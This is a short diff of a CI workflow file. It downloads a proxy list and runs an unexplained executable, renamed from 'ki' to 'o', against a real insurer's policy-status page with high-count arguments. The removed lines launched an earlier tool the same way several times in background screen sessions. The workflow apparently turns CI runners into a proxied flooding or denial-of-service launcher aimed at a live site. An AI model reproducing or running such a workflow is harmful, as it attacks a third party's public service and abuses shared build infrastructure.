@@ -33,12 +33,12 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          chmod +x tol
+          mv ki o
+          chmod +x o
           export TARGET="https://licindia.in/policy-status"
-          screen -dms ve ./tol $TARGET 200 1 1 90.txt
-          screen -dms ve ./tol $TARGET 200 1 1 90.txt
           
-          ./tol $TARGET 200 1 1 90.txt
+          
+          ./o $TARGET 200 1 1 
           
           
           
